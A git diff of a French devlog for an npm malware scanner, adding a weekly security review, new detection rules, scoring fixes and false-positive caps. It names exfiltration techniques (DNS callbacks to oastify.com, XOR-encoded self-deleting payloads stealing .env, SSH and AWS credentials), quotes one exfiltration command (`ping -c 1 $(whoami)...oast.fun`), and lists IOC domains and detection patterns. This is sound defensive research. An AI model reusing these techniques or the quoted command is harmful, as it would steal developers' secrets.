@@ -387,11 +387,122 @@ Estimation du gain FPR : **14% → 6-9%**. Je mesurerai pour de vrai apres la re
 
 ---
 
+## Security review semaine 10-17 avril (v2.10.93-97)
+
+Une semaine de monitoring 24/7 = environ 22 858 tarballs scannes, dont une fraction non triviale qui me reste sur l'ecran sous forme d'alertes Discord. Pour ne pas finir par tout ignorer, je me suis impose une revue manuelle complete de tout ce que le scanner a flagge entre le 10 et le 17 avril 2026. 37 packages confirmes malveillants au final, dont 10 qui passaient sous le seuil de triage (`ADR_THRESHOLD=20`). Deux campagnes m'ont fait realiser que la detection avait des angles morts structurels.
+
+**ltidi : la chaine d'attaque qui n'a pas besoin d'install hooks.** 9 packages stub publies avec `package.json` propre, aucun script lifecycle, aucune obfuscation, score 10. Mais une dependance vers `ltidisafe`, hostee comme tarball directe sur `ltidi.storage.googleapis.com`. npm n'audite pas les dependances par URL HTTPS, donc le payload reel n'est jamais examine par le registry. Quand j'ai telecharge le tarball externe et lu le code, c'etait un DNS exfil de `hostname/homedir/username` via des sous-domaines hex sur `*.oastify.com` (un service public de OOB callbacks). 9 packages, score 10 chacun, completement sous le radar.
+
+**csec : self-destruct apres exfil.** 3 packages avec un score de 19. XOR avec cle `OrDeR_7077` + `new Function(decoded)` pour evaluer le payload + `unlinkSync(__filename)` pour effacer le source apres execution. Exfiltre `.env`, tokens, cles SSH, `.npmrc`, `.aws/credentials` vers `csec-supply-chain-attack.vercel.app`. 19 c'est en dessous du threshold, donc aucune alerte declenchee.
+
+J'ai sorti la v2.10.93 avec 3 patches : escalation `dependency_url_suspicious` a CRITICAL pour les tarballs externes hors allowlist (la rule devient `external_tarball_dep` en v2.10.94 avec un ID dedie `MUADDIB-PKG-020`), nouvelle compound `self_destruct_eval` (CRITICAL, AST-089) qui matche `eval`/`new Function` + suppression de `__filename`/`module.filename`, et 6 nouveaux IOC domains (oast.online, oast.pro, interact.sh, etc.) plus 12 packages compromis ajoutes a la builtin. 207 rules au total. Tests : 3134 → 3230.
+
+---
+
+## La ronde des sous-threshold (v2.10.94)
+
+Apres le merge de v2.10.93, j'ai re-scanne les meme packages pour mesurer si les fixes faisaient ce qu'ils etaient censes faire. Resultats interessants : ltidi passait bien de 10 a 35 (CRITICAL `external_tarball_dep` + HIGH `dependency_ioc_match`), mais le MT-1 score ceiling cappait a 35 parce que `dependency_url_suspicious` n'etait pas dans `HIGH_CONFIDENCE_MALICE_TYPES`. Csec restait a 19 parce que `self_destruct_eval` ne matchait pas : le `unlinkSync(__filename)` etait DANS le string XOR-encode, pas dans le source visible. Apache-arrow-14 capait a 50 (le floor CRITICAL existant) sans mecanisme pour pousser plus haut. Et koa-v3 etait a 9 parce que `curl_env_exfil` ne detectait que `curl` et `wget`, pas `ping`/`nslookup`/`dig`.
+
+4 fixes scoped, tous mesures empiriquement avant merge :
+
+1. **Nouveau threat type `external_tarball_dep`** (`src/scanner/package.js`, rule `MUADDIB-PKG-020`, CRITICAL). Sortie de `dependency_url_suspicious` quand l'URL est une tarball (.tgz/.tar.gz/.tar.bz2/.zip) ET l'host n'est pas dans l'allowlist (github.com, codeload.github.com, gitlab.com, registry.npmjs.org, registry.yarnpkg.com). Ajoute a `HIGH_CONFIDENCE_MALICE_TYPES` pour bypass le MT-1 ceiling.
+
+2. **`function_runtime_args`** (`src/scanner/ast-detectors/handle-new-expression.js`, rule `MUADDIB-AST-090`, CRITICAL). Fire quand `new Function()` recoit >= 2 args literal runtime (`require`, `__dirname`, `__filename`, `module`, `exports`, `process`) + body dynamique + obfuscation dans le meme fichier (`hasFromCharCode || hasBase64Decode || hasZlibInflate`). Le gating obfuscation est crucial : sans lui, on tire sur babel-register, ts-node, pirates, jest, nyc, vitest qui ont tous des wrappers CommonJS legitimes avec `new Function('require', '__dirname', body)`.
+
+3. **`curl_env_exfil` regex etendue** : ajout de `ping|nslookup|dig|host|getent` au pattern. Catche koa-v3 qui faisait `ping -c 1 $(whoami).<hex>.oast.fun`. C'est une evasion bete qu'on aurait pu prevoir, mais on n'avait jamais teste.
+
+4. **Floor a 75 quand 2+ threat types DISTINCTS sont CRITICAL package-level** (`src/scoring.js`). Co-occurrence 2 CRITICAL package-level sans aucun benign non-malware = signature quasi-certaine. Apache-arrow-14 (`curl_env_exfil` + `lifecycle_env_exfil`) passe de 50 a 75. Koa-v3 idem.
+
+Resultats post-merge sur les memes tarballs : ltidi 35 → 50, csec-crypto-toolkit 19 → **88**, apache-arrow-14 50 → 75, koa-v3 9 → 75. Les 4 sortent du sous-threshold. Tests : 3230 → 3232. Rules : 207 → **209**.
+
+---
+
+## Le triple-gate qui n'a rien fait (v2.10.95)
+
+J'ai repere une issue plus subtile dans `src/scanner/ast.js:211` : le check `hasHashVerification` etait une regex sur `createHash + digest`. Un attaquant pouvait declencher le downgrade CRITICAL → HIGH de `download_exec_binary` avec juste `crypto.createHash('sha256').update(buf).digest('hex')` sans jamais comparer le resultat. Bypass a 3 lignes.
+
+Fix simple : la regex exige maintenant aussi un operateur de comparaison dans le meme fichier (`===`, `!==`, `.equals(`, `assert.strictEqual`/`equal`/`deepEqual`/`deepStrictEqual`, `throw`). Mesure sur 545 packages benign curated : **0 FPR delta**. Le durcissement ne reclassifie personne (tous les packages avec `createHash + digest` avaient deja une comparaison visible quelque part). Le gain est purement defensif.
+
+J'avais aussi propose un downgrade CRITICAL → MEDIUM quand `download_exec_binary` co-occurre avec `hasHashVerification=true` ET `fetchOnlySafeDomains=true`. L'hypothese : ~180 packages Cluster A legitimes (electron, sharp, @spencer-kit/aor, etc.) beneficieraient. Diagnostic empirique sur 545 packages : **0 FPR delta** (15.60 % → 15.60 %). La rule fire sur 3 packages seulement, dont 2 etaient deja LOW et le troisieme (esbuild) est domine par d'autres rules CRITICAL. Le downgrade aurait 0 impact mesurable.
+
+J'ai abandonne le triple-gate. Lecon : ne pas merger un fix qui ne montre pas de gain mesure, meme si la justification theorique est solide. La doc est dans `data/fp-v2.10.95-validation.md` (gitignored, le diagnostic complet vaut d'etre garde).
+
+Bonus de la release : un fix EPERM Windows dans `evaluate.js`. Le workflow `node bin/muaddib.js evaluate` crashait au premier package qui declenchait EPERM (locked file, long path, antivirus). Exemple observe sur `ejs` au package 369/548 : `fs.rmSync(pkgCacheDir, { recursive: true })` sur un cleanup post-erreur d'extraction remontait l'exception non-catchee jusqu'au top-level catch de `bin/muaddib.js:608`, tuant l'evaluation entiere. 8 occurrences enveloppees dans try/catch silencieux + 3 boucles `evaluateBenign*` qui wrappent le scan en try/catch (un package qui plante est marque `skipped++`, l'eval continue). Tests : 3232 → 3236.
+
+---
+
+## Quand le scanner tape sur de la doc legitime (v2.10.96-97)
+
+Sur le corpus humain que j'ai construit en revisant manuellement les alertes, j'avais 198 false positives confirmes et 104 vrais malwares. Le scanner mettait les deux ensemble dans la zone CRITICAL. Toutes les heuristiques ajoutees depuis v2.10.74 (P1-P4 + audit forensique) avaient deja capture les clusters faciles. Les 198 FP qui restaient se repartissaient en 7 patterns assez precis :
+
+1. Bundles minifies sans aucun script lifecycle (`babylonjs.bundle.js`, `vue.runtime.global.prod.js`).
+2. Installers binaires telechargeant depuis GitHub Releases (esbuild, swc, sharp, prebuild-install).
+3. Endpoints reseau dans le scope du package lui-meme (`@stripe/stripe-js` qui fetch `api.stripe.com`).
+4. Git hooks ecrits depuis source locale (husky, simple-git-hooks).
+5. Typosquats sur des noms scoped : Levenshtein faux trigger sur `@scope/foo` vs `@scope/foobar`.
+6. Obfuscation commerciale (jscrambler, javascript-obfuscator) sans aucun signal d'attaque.
+7. Packages placeholder publies pour bloquer du dependency confusion (souvent un `index.js` avec `module.exports = {}` et un README qui dit "this is a placeholder").
+
+Plutot que d'ajouter encore des heuristiques negatives au scanner (qui finiraient par tirer aussi sur des malwares qui imitent ces patterns), j'ai change d'approche. On va construire les **features contextuelles** dont un classifier ML aurait besoin pour discriminer ces 7 clusters des vrais malwares qui leur ressemblent.
+
+**v2.10.96** est de la pure plomberie. 8 features dans `src/ml/feature-extractor.js`, chacune un boolean calculable depuis le scan result + les metadonnees package (npm registry meta, file sizes, scripts) :
+
+| ID | Feature | Cluster cible |
+|----|---------|---------------|
+| F1 | `bundle_without_install_scripts` | Bundles minifies sans lifecycle |
+| F2 | `install_url_github_releases` | Binaires depuis GitHub Releases |
+| F3 | `network_destination_first_party` | Reseau dans le scope du package |
+| F4 | `git_hook_source_local` | Git hooks locaux |
+| F5 | `typosquat_scoped_package` | Faux trigger Levenshtein sur scoped |
+| F6 | `obfuscation_without_vector` | Obfuscation commerciale sans attaque |
+| F7 | `placeholder_anti_dep_confusion` | Placeholder dependency confusion |
+| F8 | `install_script_no_network_egress` | **DESACTIVEE** |
+
+F8 est volontairement laissee inerte (`features.install_script_no_network_egress = 0`). En mesurant la sortie sur le corpus malveillant, je me suis rendu compte qu'elle classifiait comme "install script sans egress reseau" des malwares qui exfiltrent via `dangerous_exec` (curl/wget directs sans utiliser les types reseau Node.js trackes par `EGRESS_TYPES`). Si je l'avais activee, le ML retrain aurait appris "install_script_no_network_egress = benign" sur des malwares confirmes. Mieux vaut une feature inactive qu'une feature qui pollue. Je la re-activerai apres avoir fixe `EGRESS_TYPES` (ajout de `dangerous_exec`, `lifecycle_dangerous_exec`, `node_inline_exec`).
+
+Cette release ne change rien au scoring. Les scans v2.10.96 produisent les memes scores que v2.10.95 sur tous les packages. Les 8 nouvelles colonnes de features sont ecrites dans `ml-training-monitor.jsonl` mais ne sont pas consommees par le pipeline. Plomberie pure.
+
+**v2.10.97** branche les 7 features actives directement dans le scoring comme post-filtre deterministe. `applyContextualFPCaps()` dans `src/scoring.js`, appele APRES `calculateRiskScore` (donc apres les compound boosts et les lifecycle floors). Sept caps deterministes, valides individuellement avec **0 malware impacte** comme critere non-negociable :
+
+| Code | Cap | Justification |
+|------|-----|---------------|
+| F1 | 30 | Bundle minifie publie sans lifecycle = bibliotheque, pas un dropper |
+| F2 | 35 | Installer binaire depuis GitHub Releases = pattern legitime |
+| F3 | 30 | Endpoint reseau dans le scope du package |
+| F4 | 35 | Git hooks ecrits depuis source locale |
+| F5 | -- | Soustrait les points typosquat (pas un cap) |
+| F6 | 35 | Obfuscation commerciale sans signaux d'attaque |
+| F7 | 20 | Placeholder anti-dep-confusion |
+
+Quand plusieurs caps s'appliquent au meme package, le `Math.min()` gagne (cap le plus serre). F5 est traite separement parce qu'il soustrait des points au lieu de plafonner.
+
+Validation finale sur le corpus humain 302 packages : **67/198 FP cappes (33.8 %)**, **0/104 malware impacte**. Les 131 FP CRITICAL restants ne matchent aucun des 7 clusters. Pour les attaquer, il faudra s'attaquer a la dedup compound scoring dans `src/scoring.js` (probablement v2.10.98+). C'est un gain visible, pas spectaculaire, mais surtout : **deterministe**, donc pas de risque de regression silencieuse comme aurait pu en avoir une approche ML qui se reentraine.
+
+Tests : 3258 → **3280**. Pas de nouvelle rule, pas de nouveau scanner. Le post-filtre est une couche au-dessus du scoring existant.
+
+---
+
+## Lecons de la semaine
+
+1. **Mesurer avant de merger.** Le triple-gate v2.10.95 paraissait evident mais n'avait aucun impact mesure. La regle "0 FPR delta = pas de merge" m'a evite de polluer le code avec une heuristique qui ne sert a rien.
+
+2. **Tester les features ML sur le corpus malveillant aussi.** F8 aurait ete une feature qui labellise des malwares comme benins si je ne l'avais pas mesuree avant activation. Une feature qui semble bien discriminer sur le corpus FP peut etre catastrophique sur le corpus malveillant.
+
+3. **Les sous-threshold sont les vrais ennemis.** ltidi et csec etaient les attaques les plus critiques de la semaine, pas a cause de leur sophistication, mais parce qu'elles passaient SOUS le radar (`score < ADR_THRESHOLD`). Tout le travail sur les rules HIGH/CRITICAL ne sert a rien si l'attaquant peut juste mettre son score a 19.
+
+4. **Le post-filtre deterministe vs le ML.** J'avais des features ML pretes, mais j'ai prefere les brancher en post-filtre deterministe plutot qu'en classifier. Raison : pas de risque de regression silencieuse au prochain retrain, decouplage de la stabilisation FPR de l'iteration ML, et chaque cap est explicable individuellement (un humain peut comprendre pourquoi un package a ete cap a 30).
+
+5. **Le corpus humain 302 packages ne remplace pas les 548 curated.** La couverture FP varie selon le corpus. Le post-filtre v2.10.97 a ete valide sur le corpus humain ; la remesure sur les 548 curated est encore a faire. Les chiffres "33.8 % de FP cappes" ne sont pas extrapolables tels quels au corpus general.
+
+6. **Les estimations valent ce qu'elles valent.** v2.10.74 estimait une reduction FPR 14% → 6-9% apres les fixes P1-P4 (cluster bundle/AST-006/quick-scan/WASM). La mesure reelle en v2.10.95 sur le corpus reconstruit a donne **15.6% (85/545)** : la reduction promise ne s'est PAS materialisee. Le corpus a derive entre les deux mesures, et les fixes P1-P4 ont ete absorbes par d'autres augmentations FP. Lecon : ne JAMAIS publier une "reduction projettee" sans la mesurer reellement, et toujours retourner verifier post-merge sur le meme corpus.
+
+---
+
 ## Ou j'en suis
 
-3 mois et demi de projet. 207 regles de detection, 14 scanners, 3230 tests. Un moniteur en 24/7 sur npm et PyPI. Deux modeles ML entraines. Un ground truth passe de 4 malwares a 67 samples + 377 confirmed_malicious dans l'auto-labeler.
+3 mois et demi de projet. 209 regles de detection, 14 scanners, 3280 tests. Un moniteur en 24/7 sur npm et PyPI. Deux modeles ML entraines plus 7 features contextuelles branches en post-filtre deterministe. Un ground truth passe de 4 malwares a 67 samples + 377 confirmed_malicious dans l'auto-labeler.
 
-Les chiffres qui comptent : TPR 93.9% (46/49 attaques reelles detectees), FPR 10.6% (56/529 packages benins flagues a tort), ADR 94.0% (101/107 samples adversariaux). Ce ne sont pas des scores parfaits, et c'est le point — un scanner avec 0% de FP ne scanne probablement rien, et un TPR de 100% sur 4 samples ne veut rien dire.
+Les chiffres qui comptent (mesure canonique v2.10.95) : **TPR@3 93.85%** (61/65 attaques actives detectees, 67 totales avec 2 protestware hors-scope), **TPR@20 86.2%** (56/65 sur le seuil operationnel), **FPR curated 15.6%** (85/545 scannes sur 548), **FPR random 7.0%** (14/200), **ADR 96.3%** (103/107 samples adversariaux). Ce ne sont pas des scores parfaits, et c'est le point : un scanner avec 0% de FP ne scanne probablement rien, et un TPR de 100% sur 4 samples ne veut rien dire.
 
 Ce qui marche bien : la detection des campagnes connues (Shai-Hulud, GlassWorm, CanisterWorm), la desobfuscation statique qui voit a travers les techniques d'evasion courantes, le sandbox avec acceleration temporelle pour les time-bombs, le compound scoring qui exploite les combinaisons impossibles en code legitime, et le dataflow inter-module qui suit les credentials a travers les frontieres de fichiers.
 
